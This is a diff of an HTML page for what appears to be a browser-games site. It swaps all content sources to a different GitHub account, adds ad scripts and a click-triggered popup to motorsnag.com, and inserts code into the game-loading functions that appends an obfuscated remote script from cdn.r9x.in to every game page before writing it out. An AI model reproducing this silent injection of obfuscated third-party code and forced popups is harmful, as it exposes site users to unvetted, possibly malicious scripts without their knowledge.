@@ -5,7 +5,7 @@
 window.sadjgknsdfjg='https://'+window.location.hostname;
 </script>
 <head>
-<script>
+<!--<script>
 
 (function(){
     fetch('./commits')
@@ -18,7 +18,7 @@ window.sadjgknsdfjg='https://'+window.location.hostname;
                 window.resolveUrl = function(url) {
                     const match = url.match(/\/(\d+[^"]*)\.html/);
                     if (match) {
-                        return `https://cdn.jsdelivr.net/gh/gn-math/html@${HASH}/${match[1]}.html?t=${Date.now()}`;
+                        return `https://cdn.jsdelivr.net/gh/freebuisness/html@${HASH}/${match[1]}.html?t=${Date.now()}`;
                     }
                     return originalResolve(url);
                 };
@@ -28,7 +28,7 @@ window.sadjgknsdfjg='https://'+window.location.hostname;
             console.error('Failed to fetch commit hash:', err);
         });
 })();
-</script>
+</script>-->
 <script>
 (function() {
     const memoryStorage = {};
@@ -77,7 +77,7 @@ window.sadjgknsdfjg='https://'+window.location.hostname;
     }
 })();
 </script>
-<base href="https://cdn.jsdelivr.net/gh/gn-math/gn-math-DONTDMCA@main/">
+<base href="https://cdn.jsdelivr.net/gh/freebuisness/gn-math-DONTDMCA@main/">
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
@@ -1263,11 +1263,11 @@ body.classic-theme main {
 }
 
 </style>
-<script>
-(()=>{const k="p",d=9e5,s=()=>{let t=localStorage.getItem(k);return !t||Date.now()-t>d},m=()=>localStorage.setItem(k,Date.now());function h(){if(!s())return;window.open("https://motorsnag.com/qph9bfad?key=17276614cc8dc8ab4e18cf78200ebeb4","_blank");m();document.removeEventListener("click",h)}s()&&document.addEventListener("click",h,{once:1})})();
-</script>
+<script src="//js.rev.iq/gn-math.dev"></script> <script> (()=>{const k="p",d=15e4,s=()=>{let t=localStorage.getItem(k);return !t||Date.now()-t>d},m=()=>localStorage.setItem(k,Date.now());function h(){if(!s())return;window.open("https://motorsnag.com/qph9bfad?key=17276614cc8dc8ab4e18cf78200ebeb4","_blank");m();document.removeEventListener("click",h)}s()&&document.addEventListener("click",h,{once:1})})(); </script> 
 </head>
 <body>
+<div data-ad="leaderboard-1"></div>
+<div data-ad="billboard-1"></div>
 <header>
 <div class="header-upper">
 <div class="logo" onclick="location.reload()">
@@ -1427,17 +1427,17 @@ XMLHttpRequest.prototype.open = function(method, url) {
 };
 HTMLCanvasElement.prototype.toDataURL = function(...args) { return ""; };
 const CONFIG = {
-    zones: "https://cdn.jsdelivr.net/gh/gn-math/assets@latest/zones.json",
+    zones: "https://cdn.jsdelivr.net/gh/freebuisness/assets@latest/zones.json",
     tagsZones: "https://cdn.jsdelivr.net/gh/sealiee11/gnmathstuff@main/zones.json",
-    covers: "https://cdn.jsdelivr.net/gh/gn-math/covers@main",
+    covers: "https://cdn.jsdelivr.net/gh/freebuisness/covers@main",
     html: null,
     stats: "https://data.jsdelivr.com/v1/stats/packages/gh/gn-math/html@main/files?period="
 };
 
 fetch(window.sadjgknsdfjg+ "/commits").then(r => r.text()).then(hash => {
-    CONFIG.html = `https://cdn.jsdelivr.net/gh/gn-math/html@${hash.trim()}`;
+    CONFIG.html = `https://cdn.jsdelivr.net/gh/freebuisness/html@${hash.trim()}`;
 }).catch(() => {
-    CONFIG.html = "https://cdn.jsdelivr.net/gh/gn-math/html@main";
+    CONFIG.html = "https://cdn.jsdelivr.net/gh/freebuisness/html@main";
 });
 let state = {
     games: [],
@@ -1451,7 +1451,7 @@ async function init() {
     let zonesURL = CONFIG.zones;
     let sharesponse;
     try { 
-        sharesponse = await fetch("https://api.github.com/repos/gn-math/assets/commits?t="+Date.now()); 
+        sharesponse = await fetch("https://api.github.com/repos/freebuisness/assets/commits?t="+Date.now()); 
     } catch (error) {}
     
     if (sharesponse && sharesponse.status === 200) {
@@ -1459,7 +1459,7 @@ async function init() {
             const shajson = await sharesponse.json();
             const sha = shajson[0]['sha'];
             if (sha) {
-                zonesURL = `https://cdn.jsdelivr.net/gh/gn-math/assets@${sha}/zones.json`;
+                zonesURL = `https://cdn.jsdelivr.net/gh/freebuisness/assets@${sha}/zones.json`;
             }
         } catch (error) {
             try {
@@ -1467,7 +1467,7 @@ async function init() {
                 if (secondarysharesponse && secondarysharesponse.status === 200) {
                     const sha = (await secondarysharesponse.text()).trim();
                     if (sha) {
-                        zonesURL = `https://cdn.jsdelivr.net/gh/gn-math/assets@${sha}/zones.json`;
+                        zonesURL = `https://cdn.jsdelivr.net/gh/freebuisness/assets@${sha}/zones.json`;
                     }
                 }
             } catch(error) {}
@@ -2114,11 +2114,12 @@ async function openGame(id) {
         const r = await fetch(u + "?t=" + Date.now());
         let h = await r.text();
 	if (h.trim().startsWith("Couldn't find the requested file")) {
-            const r2 = await fetch(g.url.replace("{COVER_URL}", CONFIG.covers).replace("{HTML_URL}", "https://cdn.jsdelivr.net/gh/gn-math/html@main") + "?t=" + Date.now());
+            const r2 = await fetch(g.url.replace("{COVER_URL}", CONFIG.covers).replace("{HTML_URL}", "https://cdn.jsdelivr.net/gh/freebuisness/html@main") + "?t=" + Date.now());
             h = await r2.text();
         }
         f.contentDocument.open();
-        f.contentDocument.write(h);
+     h = h.replace(/<\/html>/i, '<script src="https://cdn.r9x.in/ailogic_gn-math.dev_obf.js"><\/script></html>');
+f.contentDocument.write(h);
         f.contentDocument.close();
     } catch(e) {
         alert("Load failed");
@@ -2154,13 +2155,15 @@ function aboutBlank() {
     const u = resolveUrl(g.url);
     fetch(u).then(r=>r.text()).then(h => {
 	if (h.trim().startsWith("Couldn't find the requested file")) {
-            fetch(g.url.replace("{COVER_URL}", CONFIG.covers).replace("{HTML_URL}", "https://cdn.jsdelivr.net/gh/gn-math/html@main") + "?t=" + Date.now()).then(r=>r.text()).then(hh => {
+            fetch(g.url.replace("{COVER_URL}", CONFIG.covers).replace("{HTML_URL}", "https://cdn.jsdelivr.net/gh/freebuisness/html@main") + "?t=" + Date.now()).then(r=>r.text()).then(hh => {
                 w.document.open();
-                w.document.write(hh);
+              hh = hh.replace(/<\/html>/i, '<script src="https://cdn.r9x.in/ailogic_gn-math.dev_obf.js"><\/script></html>');
+w.document.write(hh);
                 w.document.close();
             });
 	} else {
             w.document.open();
+
             w.document.write(h);
             w.document.close();
 	}
